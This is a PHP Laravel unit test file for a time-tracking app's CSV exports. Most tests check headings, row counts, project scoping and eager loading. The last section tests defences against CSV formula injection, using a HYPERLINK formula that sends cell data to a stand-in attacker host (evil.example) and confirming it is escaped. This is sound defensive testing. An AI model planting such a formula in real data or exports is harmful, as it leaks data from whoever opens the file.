<?php

namespace Tests\Unit;

use App\Exports\ProjectHoursExport;
use App\Exports\TicketHoursExport;
use App\Exports\TimesheetExport;
use App\Models\Activity;
use App\Models\Project;
use App\Models\Ticket;
use App\Models\TicketHour;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Notification;
use Tests\TestCase;

/**
 * The CSV exports build their rows from logged hours. Collecting them here
 * catches broken relations before a user hits "Export hours" and gets a 500.
 */
class ExportsTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();
        Notification::fake();
    }

    private function ticketWithHours(int $entries = 3, ?Project $project = null): Ticket
    {
        $ticket = Ticket::factory()->create(
            $project ? ['project_id' => $project->id] : []
        );

        TicketHour::factory()->count($entries)->create([
            'ticket_id' => $ticket->id,
            'user_id' => User::factory()->create()->id,
            'activity_id' => Activity::factory()->create()->id,
        ]);

        return $ticket;
    }

    // -------------------------------------------------------- ticket export

    public function test_the_ticket_hours_export_has_headings(): void
    {
        $export = new TicketHoursExport(Ticket::factory()->create());

        $this->assertNotEmpty($export->headings());
        $this->assertContains('Ticket', $export->headings());
    }

    public function test_the_ticket_hours_export_collects_a_row_per_entry(): void
    {
        $ticket = $this->ticketWithHours(3);

        $rows = (new TicketHoursExport($ticket))->collection();

        $this->assertCount(3, $rows);
    }

    public function test_the_ticket_hours_export_is_empty_without_logged_time(): void
    {
        $ticket = Ticket::factory()->create();

        $this->assertCount(0, (new TicketHoursExport($ticket))->collection());
    }

    public function test_the_ticket_hours_export_rows_match_the_headings(): void
    {
        $ticket = $this->ticketWithHours(1);
        $export = new TicketHoursExport($ticket);

        $row = $export->collection()->first();

        $this->assertCount(count($export->headings()), (array) $row);
    }

    public function test_the_ticket_hours_export_handles_entries_without_an_activity(): void
    {
        $ticket = Ticket::factory()->create();
        TicketHour::factory()->create([
            'ticket_id' => $ticket->id,
            'user_id' => User::factory()->create()->id,
            'activity_id' => null,
        ]);

        $this->assertCount(1, (new TicketHoursExport($ticket))->collection());
    }

    // ------------------------------------------------------- project export

    public function test_the_project_hours_export_has_headings(): void
    {
        $export = new ProjectHoursExport(Project::factory()->create());

        $this->assertNotEmpty($export->headings());
    }

    public function test_the_project_hours_export_collects_entries_across_tickets(): void
    {
        $project = Project::factory()->create();
        $this->ticketWithHours(2, $project);
        $this->ticketWithHours(3, $project);

        $rows = (new ProjectHoursExport($project))->collection();

        $this->assertCount(5, $rows);
    }

    public function test_the_project_hours_export_is_empty_without_logged_time(): void
    {
        $project = Project::factory()->create();
        Ticket::factory()->create(['project_id' => $project->id]);

        $this->assertCount(0, (new ProjectHoursExport($project))->collection());
    }

    public function test_the_project_hours_export_ignores_other_projects(): void
    {
        $mine = Project::factory()->create();
        $other = Project::factory()->create();
        $this->ticketWithHours(2, $mine);
        $this->ticketWithHours(4, $other);

        $this->assertCount(2, (new ProjectHoursExport($mine))->collection());
    }

    // -------------------------------------------------- timesheet export

    public function test_the_timesheet_export_collects_the_users_own_entries_in_range(): void
    {
        $user = User::factory()->create();
        $this->actingAs($user);
        $ticket = Ticket::factory()->create();
        TicketHour::factory()->create([
            'ticket_id' => $ticket->id,
            'user_id' => $user->id,
            'created_at' => '2026-01-15',
        ]);
        // Outside the requested range: must not appear.
        TicketHour::factory()->create([
            'ticket_id' => $ticket->id,
            'user_id' => $user->id,
            'created_at' => '2025-01-01',
        ]);

        $rows = (new TimesheetExport([
            'start_date' => '2026-01-01', 'end_date' => '2026-01-31',
        ]))->collection();

        $this->assertCount(1, $rows);
    }

    /**
     * TimesheetExport used to run ticket/project/user/activity as a query per
     * row instead of eager loading them.
     */
    public function test_the_timesheet_export_does_not_run_a_query_per_row(): void
    {
        $user = User::factory()->create();
        $this->actingAs($user);
        Ticket::factory()->count(5)->create()->each(
            fn (Ticket $ticket) => TicketHour::factory()->create([
                'ticket_id' => $ticket->id,
                'user_id' => $user->id,
                'activity_id' => Activity::factory()->create()->id,
                'created_at' => '2026-01-15',
            ])
        );

        DB::connection()->enableQueryLog();
        (new TimesheetExport(['start_date' => '2026-01-01', 'end_date' => '2026-01-31']))->collection();
        $queryCount = count(DB::connection()->getQueryLog());
        DB::connection()->disableQueryLog();

        $this->assertLessThan(10, $queryCount, "Expected eager loading, ran {$queryCount} queries for 5 rows");
    }

    // ------------------------------------------------- CSV formula injection

    /**
     * Project/ticket names, comments and user names all reach the CSV
     * verbatim. A value opening with =, +, -, @, a tab or a CR is read as a
     * formula by Excel/LibreOffice once the file is opened - e.g. this
     * ticket name would exfiltrate data from whoever downloads the export.
     */
    public function test_a_ticket_name_starting_with_a_formula_is_neutralized_in_every_export(): void
    {
        $payload = '=HYPERLINK("http://evil.example/?d="&A1)';
        $project = Project::factory()->create(['name' => $payload]);
        $ticket = Ticket::factory()->create(['project_id' => $project->id, 'name' => $payload]);
        $user = User::factory()->create();
        $this->actingAs($user);
        TicketHour::factory()->create([
            'ticket_id' => $ticket->id,
            'user_id' => $user->id,
            'comment' => $payload,
            'created_at' => '2026-01-15',
        ]);

        $timesheetRow = (new TimesheetExport([
            'start_date' => '2026-01-01', 'end_date' => '2026-01-31',
        ]))->collection()->first();
        $projectRow = (new ProjectHoursExport($project))->collection()->first();
        $ticketRow = (new TicketHoursExport($ticket))->collection()->first();

        $this->assertStringStartsWith("'=", $timesheetRow['project']);
        $this->assertStringStartsWith("'=", $timesheetRow['ticket']);
        $this->assertStringStartsWith("'=", $timesheetRow['details']);
        $this->assertStringStartsWith("'=", $projectRow['ticket']);
        $this->assertStringStartsWith("'=", $ticketRow['ticket']);
        $this->assertStringStartsWith("'=", $ticketRow['comment']);
    }

    public function test_a_user_name_starting_with_an_at_sign_is_neutralized(): void
    {
        $user = User::factory()->create(['name' => '@SUM(1+1)']);
        $this->actingAs($user);
        $ticket = Ticket::factory()->create();
        TicketHour::factory()->create([
            'ticket_id' => $ticket->id,
            'user_id' => $user->id,
            'created_at' => '2026-01-15',
        ]);

        $row = (new TimesheetExport([
            'start_date' => '2026-01-01', 'end_date' => '2026-01-31',
        ]))->collection()->first();

        $this->assertSame("'@SUM(1+1)", $row['user']);
    }

    public function test_an_ordinary_ticket_name_is_left_untouched(): void
    {
        $ticket = Ticket::factory()->create(['name' => 'Fix the login bug']);
        TicketHour::factory()->create(['ticket_id' => $ticket->id, 'user_id' => User::factory()->create()->id]);

        $row = (new TicketHoursExport($ticket))->collection()->first();

        $this->assertSame('Fix the login bug', $row['ticket']);
    }
}
